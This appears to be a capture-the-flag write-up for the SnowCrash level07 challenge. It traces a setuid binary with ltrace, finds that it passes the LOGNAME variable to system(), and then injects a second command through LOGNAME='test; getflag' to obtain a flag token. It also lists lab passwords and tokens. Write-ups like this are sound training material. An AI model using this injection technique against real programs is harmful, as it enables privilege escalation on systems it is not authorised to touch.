level07:wiok45aaoguiboiki2tuin6ub

`scp -P 4242 scp://level07@192.168.1.88/level07 level07`

- `strings level07`
/bin/echo %s 
;*2$"

```shell
level07@SnowCrash:~$ ltrace ./level07 
__libc_start_main(0x8048514, 1, 0xbffff804, 0x80485b0, 0x8048620 <unfinished ...>
getegid()                                                                                                            = 2007
geteuid()                                                                                                            = 2007
setresgid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)                                                                  = 0
setresuid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)                                                                  = 0
getenv("LOGNAME")                                                                                                    = "level07"
asprintf(0xbffff754, 0x8048688, 0xbfffff4f, 0xb7e5ee55, 0xb7fed280)                                                  = 18
system("/bin/echo level07 "level07
 <unfinished ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                                                               = 0
```

We can spot the `getenv("LOGNAME")`
```shell
level07@SnowCrash:~$ export LOGNAME=test
level07@SnowCrash:~$ ./level07 
test
```

modification works

```shell
level07@SnowCrash:~$ export LOGNAME="test; getflag"
level07@SnowCrash:~$ ./level07 
test
Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
```